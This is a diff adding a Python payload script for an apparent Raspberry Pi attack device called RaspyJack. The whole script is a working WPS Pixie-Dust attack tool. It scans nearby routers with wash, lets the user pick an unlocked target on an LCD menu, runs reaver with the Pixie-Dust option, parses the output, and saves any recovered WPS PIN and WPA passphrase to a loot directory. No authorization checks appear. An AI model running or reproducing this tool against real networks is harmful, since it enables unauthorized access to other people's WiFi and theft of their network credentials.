@@ -1,0 +1,281 @@
+#!/usr/bin/env python3
+"""
+RaspyJack *payload* – **WPS Pixie-Dust Attack**
+================================================
+An advanced WiFi payload that uses Reaver and PixieWPS to attack WiFi
+Protected Setup (WPS) in order to recover the WPA PSK. This attack
+is effective against many routers with vulnerable WPS implementations.
+
+Features:
+1.  Uses `wash` to scan for WPS-enabled, non-locked access points.
+2.  Provides a UI to select a target from the scan results.
+3.  Launches `reaver` with the Pixie-Dust (`-K 1`) option.
+4.  Parses reaver's output to display the attack status in real-time.
+5.  Displays the recovered WPA PSK and WPS PIN if the attack is successful.
+6.  Saves successful cracks to a loot file.
+"""
+
+# ---------------------------------------------------------------------------
+# 0) Imports & boilerplate
+# ---------------------------------------------------------------------------
+import os, sys, subprocess, signal, time, re, threading
+sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+
+# ---------------------------- Third‑party libs ----------------------------
+import RPi.GPIO as GPIO
+import LCD_1in44, LCD_Config
+from PIL import Image, ImageDraw, ImageFont
+
+# ---------------------------------------------------------------------------
+# 1) GPIO mapping (BCM)
+# ---------------------------------------------------------------------------
+PINS: dict[str, int] = {
+    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
+    "KEY1": 21, "KEY2": 20, "KEY3": 16,
+}
+
+# ---------------------------------------------------------------------------
+# 2) GPIO & LCD initialisation
+# ---------------------------------------------------------------------------
+GPIO.setmode(GPIO.BCM)
+for pin in PINS.values():
+    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+
+LCD = LCD_1in44.LCD()
+LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
+WIDTH, HEIGHT = 128, 128
+FONT = ImageFont.load_default()
+FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
+
+# ---------------------------------------------------------------------------
+# 3) Global State & Configuration
+# ---------------------------------------------------------------------------
+WIFI_INTERFACE = "wlan1mon" # Assumes monitor mode is set
+LOOT_DIR = "/root/Raspyjack/loot/WPS_Pixie/"
+running = True
+attack_process = None
+status_lines = ["Waiting to start..."]
+ui_lock = threading.Lock()
+
+# ---------------------------------------------------------------------------
+# 4) Graceful shutdown
+# ---------------------------------------------------------------------------
+def cleanup(*_):
+    global running
+    if running:
+        running = False
+        if attack_process:
+            try:
+                os.kill(attack_process.pid, signal.SIGTERM)
+            except ProcessLookupError:
+                pass
+
+signal.signal(signal.SIGINT, cleanup)
+signal.signal(signal.SIGTERM, cleanup)
+
+# ---------------------------------------------------------------------------
+# 5) UI Functions
+# ---------------------------------------------------------------------------
+def draw_message(message, color="yellow"):
+    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+    d = ImageDraw.Draw(img)
+    y = 40
+    for line in message.split('\n'):
+        bbox = d.textbbox((0, 0), line, font=FONT_TITLE)
+        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
+        x = (WIDTH - w) // 2
+        d.text((x, y), line, font=FONT_TITLE, fill=color)
+        y += h + 5
+    LCD.LCD_ShowImage(img, 0, 0)
+
+def draw_list_ui(title, items, selected_index):
+    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+    d = ImageDraw.Draw(img)
+    d.text((5, 5), title, font=FONT_TITLE, fill="#00FF00")
+    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
+
+    if not items:
+        d.text((10, 60), "Nothing found.", font=FONT, fill="white")
+    else:
+        start_index = max(0, selected_index - 3)
+        end_index = min(len(items), start_index + 7)
+        y_pos = 25
+        for i in range(start_index, end_index):
+            color = "yellow" if i == selected_index else "white"
+            line = items[i]['essid'][:16] # Truncate long SSIDs
+            d.text((5, y_pos), line, font=FONT, fill=color)
+            y_pos += 12
+            
+    d.text((5, 110), "OK=Select | KEY3=Back", font=FONT, fill="cyan")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+def draw_attack_ui():
+    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+    d = ImageDraw.Draw(img)
+    d.text((5, 5), "WPS Pixie-Dust Attack", font=FONT_TITLE, fill="#FF0000")
+    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
+    
+    with ui_lock:
+        y_pos = 25
+        for line in status_lines:
+            d.text((5, y_pos), line, font=FONT, fill="white")
+            y_pos += 12
+            
+    d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="orange")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+# ---------------------------------------------------------------------------
+# 6) Core Attack Functions
+# ---------------------------------------------------------------------------
+def check_dependencies():
+    deps = ["reaver", "wash"]
+    for dep in deps:
+        if subprocess.run(f"which {dep}", shell=True, capture_output=True).returncode != 0:
+            return dep
+    return None
+
+def scan_for_targets():
+    draw_message("Scanning with wash...")
+    targets = []
+    try:
+        # Use -j to get JSON output for easier parsing
+        proc = subprocess.Popen(f"wash -i {WIFI_INTERFACE} -j", shell=True, stdout=subprocess.PIPE, text=True)
+        time.sleep(10) # Scan for 10 seconds
+        proc.terminate()
+        
+        for line in proc.stdout:
+            try:
+                import json
+                data = json.loads(line)
+                if not data.get('is_locked'):
+                    targets.append({
+                        "bssid": data['bssid'],
+                        "essid": data['essid'],
+                        "channel": data['channel']
+                    })
+            except (json.JSONDecodeError, KeyError):
+                continue
+    except Exception as e:
+        print(f"Wash scan failed: {e}", file=sys.stderr)
+    return targets
+
+def run_attack(target):
+    global attack_process, status_lines
+    
+    bssid = target['bssid']
+    channel = target['channel']
+    essid = target['essid']
+    
+    command = [
+        "reaver",
+        "-i", WIFI_INTERFACE,
+        "-b", bssid,
+        "-c", str(channel),
+        "-K", "1", # The Pixie-Dust attack
+        "-vv" # Very verbose output to parse
+    ]
+    
+    attack_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    
+    wps_pin = None
+    wpa_psk = None
+
+    while running and attack_process.poll() is None:
+        line = attack_process.stdout.readline()
+        if not line:
+            break
+        
+        line = line.strip()
+        with ui_lock:
+            if "[+]" in line:
+                status_lines = [essid[:16], line.replace("[+]", "").strip()]
+            elif "[!]" in line:
+                status_lines = [essid[:16], "Error:", line.replace("[!]", "").strip()[:20]]
+            
+            if "WPS PIN:" in line:
+                wps_pin = line.split(':')[1].strip().replace("'", "")
+            if "WPA PSK:" in line:
+                wpa_psk = line.split(':')[1].strip().replace("'", "")
+
+        if wpa_psk:
+            break # Success!
+
+    if wpa_psk:
+        with ui_lock:
+            status_lines = ["Success!", f"PIN: {wps_pin}", f"PSK: {wpa_psk[:16]}"]
+        os.makedirs(LOOT_DIR, exist_ok=True)
+        loot_file = os.path.join(LOOT_DIR, f"{essid.replace(' ', '_')}.txt")
+        with open(loot_file, "w") as f:
+            f.write(f"ESSID: {essid}\n")
+            f.write(f"BSSID: {bssid}\n")
+            f.write(f"WPS PIN: {wps_pin}\n")
+            f.write(f"WPA PSK: {wpa_psk}\n")
+    elif running:
+        with ui_lock:
+            status_lines = ["Attack failed or", "was stopped."]
+
+# ---------------------------------------------------------------------------
+# 7) Main Loop
+# ---------------------------------------------------------------------------
+try:
+    dep_missing = check_dependencies()
+    if dep_missing:
+        draw_message(f"{dep_missing} not found!", "red")
+        time.sleep(5)
+        raise SystemExit(f"{dep_missing} not found")
+
+    # Main menu loop
+    while running:
+        targets = scan_for_targets()
+        
+        if not targets:
+            draw_message("No vulnerable\ntargets found.")
+            time.sleep(3)
+            continue
+
+        selected_index = 0
+        # Target selection loop
+        while running:
+            draw_list_ui("Select Target", targets, selected_index)
+            
+            if GPIO.input(PINS["KEY3"]) == 0:
+                break # Go back to main menu (rescan)
+            
+            if GPIO.input(PINS["UP"]) == 0:
+                selected_index = (selected_index - 1) % len(targets)
+                time.sleep(0.2)
+            elif GPIO.input(PINS["DOWN"]) == 0:
+                selected_index = (selected_index + 1) % len(targets)
+                time.sleep(0.2)
+            elif GPIO.input(PINS["OK"]) == 0:
+                target = targets[selected_index]
+                attack_thread = threading.Thread(target=run_attack, args=(target,), daemon=True)
+                attack_thread.start()
+                
+                # Attack display loop
+                while attack_thread.is_alive():
+                    draw_attack_ui()
+                    if GPIO.input(PINS["KEY3"]) == 0:
+                        cleanup() # Signal thread to stop
+                        break
+                    time.sleep(1)
+                
+                attack_thread.join(timeout=2)
+                draw_attack_ui() # Final status draw
+                time.sleep(5)
+                break # Break to main menu
+            
+            time.sleep(0.05)
+        
+        if GPIO.input(PINS["KEY3"]) == 0:
+            cleanup()
+
+except (KeyboardInterrupt, SystemExit):
+    pass
+except Exception as e:
+    print(f"[ERROR] {e}", file=sys.stderr)
+finally:
+    cleanup()
+    LCD.LCD_Clear()
+    GPIO.cleanup()
+    print("WPS Pixie-Dust payload finished.")
